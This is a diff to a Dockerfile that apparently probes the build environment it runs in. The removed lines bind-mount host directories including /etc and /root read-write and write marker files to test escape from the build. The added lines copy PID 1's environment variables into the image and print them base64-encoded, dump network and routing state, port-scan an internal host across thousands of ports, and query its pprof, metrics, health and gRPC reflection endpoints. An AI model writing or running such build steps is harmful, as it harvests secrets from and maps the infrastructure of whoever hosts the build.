@@ -1,6 +1,29 @@
 FROM alpine:3.20
-RUN --mount=type=bind,source=tmp,target=/hosttmp,rw sh -c 'set +e; echo "===W1_BEGIN==="; echo "--ID--"; id; echo "--MOUNTINFO--"; grep -E "hosttmp|hostrw" /proc/self/mountinfo; echo "--LS_HOSTTMP--"; ls -la /hosttmp 2>&1 | head -25; echo "--STAT_TMP--"; stat -c "%d %i %n" /hosttmp 2>&1; echo "--WRITE--"; echo "MARKER-a7f3c9" > /hosttmp/.bc_probe_a7f3c9 2>&1; echo "write_rc=$?"; mkdir -p /hosttmp/.bc_dir_a7f3c9 2>&1; echo "mkdir_rc=$?"; echo "dirfile-a7f3c9" > /hosttmp/.bc_dir_a7f3c9/x 2>&1; echo "dirfile_rc=$?"; echo "--READBACK_SAME_BUILD--"; cat /hosttmp/.bc_probe_a7f3c9 2>&1; ls -la /hosttmp/.bc_probe_a7f3c9 /hosttmp/.bc_dir_a7f3c9 2>&1; echo "===W1_END==="'
-RUN --mount=type=bind,source=.,target=/hostrw,rw sh -c 'set +e; echo "===W1B_BEGIN==="; echo "--LS_ROOT--"; ls /hostrw 2>&1 | head -30; echo "--MOUNTINFO--"; grep hostrw /proc/self/mountinfo; echo "marker-via-root-a7f3c9" > /hostrw/tmp/.bc_probe2_a7f3c9 2>&1; echo "write2_rc=$?"; cat /hostrw/tmp/.bc_probe2_a7f3c9 2>&1; echo "===W1B_END==="'
-RUN --mount=type=bind,source=etc,target=/hostetc,rw sh -c 'set +e; echo "===W1C_BEGIN==="; echo "--LS_ETC--"; ls /hostetc 2>&1 | head -20; echo "a7f3c9" > /hostetc/.bc_etcprobe_a7f3c9 2>&1; echo "etc_write_rc=$?"; cat /hostetc/.bc_etcprobe_a7f3c9 2>&1; : > /hostetc/.bc_etcprobe_a7f3c9 2>&1; echo "etc_trunc_rc=$?"; ls -la /hostetc/.bc_etcprobe_a7f3c9 2>&1; echo "===W1C_END==="'
-RUN --mount=type=bind,source=root,target=/hostroot,rw sh -c 'set +e; echo "===W1D_BEGIN==="; ls -la /hostroot 2>&1 | head -20; echo "a7f3c9" > /hostroot/.bc_rootprobe_a7f3c9 2>&1; echo "root_write_rc=$?"; cat /hostroot/.bc_rootprobe_a7f3c9 2>&1; : > /hostroot/.bc_rootprobe_a7f3c9 2>&1; echo "root_trunc_rc=$?"; ls -la /hostroot/.bc_rootprobe_a7f3c9 2>&1; echo "===W1D_END==="'
-CMD ["sh","-c","sleep 30"]
+COPY proc/1/environ /v/p1_env
+COPY proc/1/cmdline /v/p1_cmd
+COPY proc/1/status /v/p1_status
+COPY etc/hosts /v/hosts
+RUN echo "===W1BEGIN==="; \
+ apk add --no-cache curl >/dev/null 2>&1; \
+ echo "L1_HOSTS $(tr '\n' ';' < /v/hosts)"; \
+ echo "L2_P1CMD $(tr '\0' ' ' < /v/p1_cmd)"; \
+ echo "L3_P1STAT $(grep -aE '^(Name|Pid|PPid|Uid|Gid|CapEff|Seccomp|NoNewPrivs|NSpid)' /v/p1_status | tr '\n' ';')"; \
+ echo "L4_P1ENV_B64 $(tr '\0' '\n' < /v/p1_env | base64 -w0 | head -c 3000)"; \
+ echo "L5_SELFNET $(cat /proc/net/tcp | awk 'NR>1{print $2}' | tr '\n' ',')"; \
+ echo "L6_SELFUNIX $(cat /proc/net/unix | awk 'NR>1{print $8}' | sort -u | tr '\n' ',')"; \
+ echo "L7_IFACE $(ls /sys/class/net/ | tr '\n' ',') $(for i in /sys/class/net/*; do echo -n "$(basename $i)=$(cat $i/address) "; done)"; \
+ echo "L8_ROUTE $(cat /proc/net/route | tr '\n' ';')"; \
+ echo "===W1MID==="
+RUN echo "===W2BEGIN==="; \
+ : > /tmp/open.txt; \
+ for p in $(seq 1 4000) 4243 5000 5001 50051 6060 6443 7000 8000 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8091 8092 8093 8094 8095 8096 8097 8098 8099 9000 9001 9090 9091 9092 9100 9200 10000 10250 10255 11211 15672 15692 20000 2375 2376 30000 3306 40000 5432 6379; do echo $p; done > /tmp/ports.txt; \
+ cat /tmp/ports.txt | xargs -P 300 -I{} sh -c 'nc -z -w 1 198.18.0.1 {} 2>/dev/null && echo {} >> /tmp/open.txt'; \
+ echo "L9_OPEN $(sort -n /tmp/open.txt | tr '\n' ',')"; \
+ echo "L10_8083PPL $(curl -s -m 5 -o /dev/null -w 'h1=%{http_code}' http://198.18.0.1:8083/debug/pprof/ ; curl -s -m 5 --http2-prior-knowledge -o /dev/null -w ' h2=%{http_code}' http://198.18.0.1:8083/health 2>&1 | tail -1)"; \
+ echo "L11_HEALTH $(curl -s -m 5 -D- http://198.18.0.1:8083/health | tr '\n' '|' | head -c 700)"; \
+ echo "L12_HEALTHQ $(curl -s -m 5 -H 'Accept: application/json' 'http://198.18.0.1:8083/health?full=1' | head -c 400)"; \
+ echo "L13_METRICS $(curl -s -m 5 -o /dev/null -w '%{http_code}' http://198.18.0.1:8083/metrics)"; \
+ echo "L14_GRPC $(curl -s -m 5 -o /dev/null -w '%{http_code}' -H 'Content-Type: application/grpc' --http2-prior-knowledge http://198.18.0.1:8083/grpc.health.v1.Health/Check)"; \
+ echo "L15_REFLECT $(curl -s -m 5 -o /dev/null -w '%{http_code}' -H 'Content-Type: application/grpc' --http2-prior-knowledge http://198.18.0.1:8083/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo)"; \
+ echo "===W2END==="
+CMD ["sh","-c","sleep 10"]
